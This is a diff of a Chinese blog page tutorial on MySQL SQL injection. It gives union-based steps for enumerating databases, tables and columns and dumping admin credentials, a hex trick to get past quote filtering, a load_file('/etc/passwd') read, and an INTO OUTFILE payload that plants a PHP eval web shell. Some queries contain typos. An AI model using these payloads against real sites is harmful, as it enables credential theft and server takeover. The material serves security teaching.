@@ -82,7 +82,7 @@
 <meta property="og:site_name" content="简单的世界">
 <meta property="og:description" content="web 安全之 SQL 注入漏洞1SCHEMATA 表：(所有的数据库名在这个表)提供了当前 mysql 实例中所有数据库的信息。是show databases 的结果取之此表。 TABLES 表：(所有的数据库的表名在这个表)提供了关于数据库中的表的信息（包括视图）。 详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。是 show tables fromschemaname">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-06-29T08:39:29.939Z">
+<meta property="og:updated_time" content="2019-06-29T08:48:18.006Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQL注入漏洞">
 <meta name="twitter:description" content="web 安全之 SQL 注入漏洞1SCHEMATA 表：(所有的数据库名在这个表)提供了当前 mysql 实例中所有数据库的信息。是show databases 的结果取之此表。 TABLES 表：(所有的数据库的表名在这个表)提供了关于数据库中的表的信息（包括视图）。 详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。是 show tables fromschemaname">
@@ -381,13 +381,17 @@ load_file(‘/etc/passwd’) MYSQL 读取本地文件的函数
 <pre><code>• 文件名必须全路径（绝对路径），
 • 用户必须有写文件的权限
 • 没有对 ‘ 单引号过滤
-</code></pre><p>SELECT ‘&lt;?php eval($_POST[1]); ?&gt;’ into outfile ‘<br>D://phpStudy//WWW//hack.php ‘</p>
+</code></pre><p>SELECT ‘&lt;?php eval($_POST[1]); ?&gt;’ into outfile ‘D://phpStudy//WWW//hack.php ‘</p>
 <p>连接字符串函数</p>
 <pre><code>1,concat(str1,str2)
 2, concat_ws(separator, str1,str2...)
 3,group_concat(str1,str2......) 
-</code></pre><p>MySQL 的 concat 函数可以连接一个或者多个字符串<br>concat(str1,0x23,str2,0x23); //0x23 #<br>concat_ws()函数, 表示 concat with separator,即有分隔符的字符串连接<br>concat_ws(0x23,str1,str2,str3)<br>group_concat() 函数,把每一行数据分到一个组里显示出来</p>
-<p>MySQL 中 中 information_scheme 库</p>
+</code></pre><p>MySQL 的 concat 函数可以连接一个或者多个字符串</p>
+<pre><code>concat(str1,0x23,str2,0x23); //0x23 #
+concat_ws()函数, 表示 concat with separator,即有分隔符的字符串连接
+concat_ws(0x23,str1,str2,str3)
+group_concat() 函数,把每一行数据分到一个组里显示出来
+</code></pre><p>MySQL 中 中 information_scheme 库</p>
 <pre><code>SCHEMATA 表 字段：SCHEMA_NAME (数据库名字)
 TABLES 表 字段：TABLE_SCHEMA， TABLE_NAME
 COLUMNS 表 字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME
@@ -402,14 +406,38 @@ COLUMNS 表 字段：TBALE_SCHEMA,TABLE_NAME,COLUMN_NAME
 方便、快捷、易于利用
 缺点:
 需要显示位
-</code></pre><p>1 、判断列数<br>order by 10<br>order by 20<br>order by 15 ……</p>
-<p>2 、 判断显示位<br>php?id=-1 union select 1,2,3,4,5</p>
-<p>3 、 获取当数据库名称和当前连接数据库的用户 联合行<br>php?id=-1 union select 1,2,databaes(),4,5<br>php?id=-1 union select 1,2,user(),4,5</p>
-<p>4 、列出所有数据库<br>limit 一个一个打印出来库名<br>select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA</p>
-<p>5 、列 出( 数据库：xss) 中所有的表<br>limit 一个一个打印出来字段名 schema [ˈski:mə]<br>select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=’xss’ limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(TABLE_NAME) from information_schema.TABLES where<br>TABLE_SCHEMA=0x674657374<br>注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。</p>
-<p>6 、列出（数据库：xss 表：admins ）中所有的字段<br>limit 一个一个打印出来<br>select COLIMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=’xss’ and<br>TABLENAME=’admins ‘ limit 0,1<br>group_concat 一次性全部显示<br>select group_concat(COLUMN_NAME) from information_schema.COLUMNS where<br>TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e</p>
-<p>7 、列出（数据库：xss 表：admins ）中的数据<br>limit 一个一个打印出来 select username,passwd from xss.admins limit 0,1<br>group_concat 把 一次性全部打印<br>select group_concat(concat(username,0x20,passwd)) from xss.admins</p>
-<h3 id="web-安全之-SQL-注入漏洞2"><a href="#web-安全之-SQL-注入漏洞2" class="headerlink" title="web 安全之 SQL 注入漏洞2"></a>web 安全之 SQL 注入漏洞2</h3><p>Error-based SQL injection 基于错误的sql注入</p>
+</code></pre><p>1 、判断列数</p>
+<pre><code>order by 10
+order by 20
+order by 15 ......
+</code></pre><p>2 、 判断显示位</p>
+<pre><code>php?id=-1 union select 1,2,3,4,5
+</code></pre><p>3 、 获取当数据库名称和当前连接数据库的用户 联合行<br>php?id=-1 union select 1,2,databaes(),4,5<br>php?id=-1 union select 1,2,user(),4,5</p>
+<p>4 、列出所有数据库</p>
+<pre><code>limit 一个一个打印出来库名
+select SCHEMA_NAME from information_schema.SCHEMATA limit 0,1
+group_concat 一次性全部显示
+select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
+</code></pre><p>5 、列 出( 数据库：xss) 中所有的表</p>
+<pre><code>limit 一个一个打印出来字段名 schema [ˈski:mə]
+select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&apos;xss&apos; limit 0,1
+group_concat 一次性全部显示
+select group_concat(TABLE_NAME) from information_schema.TABLES where
+TABLE_SCHEMA=0x674657374
+
+注意：数据库名称可以用十六进制来代替字符串，这样可以绕过单引号的限制。
+</code></pre><p>6 、列出（数据库：xss 表：admins ）中所有的字段</p>
+<pre><code>limit 一个一个打印出来
+select COLIMN_NAME from information_schema.COLUMNS where TABLE_SCHEMA=&apos;xss&apos; and
+TABLENAME=&apos;admins &apos; limit 0,1
+group_concat 一次性全部显示
+select group_concat(COLUMN_NAME) from information_schema.COLUMNS where
+TABLE_SCHEMA=0x74657374 and TABLE_NAME=0x61646d696e
+</code></pre><p>7 、列出（数据库：xss 表：admins ）中的数据</p>
+<pre><code>limit 一个一个打印出来 select username,passwd from xss.admins limit 0,1
+group_concat 把 一次性全部打印
+select group_concat(concat(username,0x20,passwd)) from xss.admins
+</code></pre><h3 id="web-安全之-SQL-注入漏洞2"><a href="#web-安全之-SQL-注入漏洞2" class="headerlink" title="web 安全之 SQL 注入漏洞2"></a>web 安全之 SQL 注入漏洞2</h3><p>Error-based SQL injection 基于错误的sql注入</p>
 <pre><code>利用前提:
 页面上没有显示位，但是需要输出 SQL 语句执行错误信息。比如 mysql_error()
 
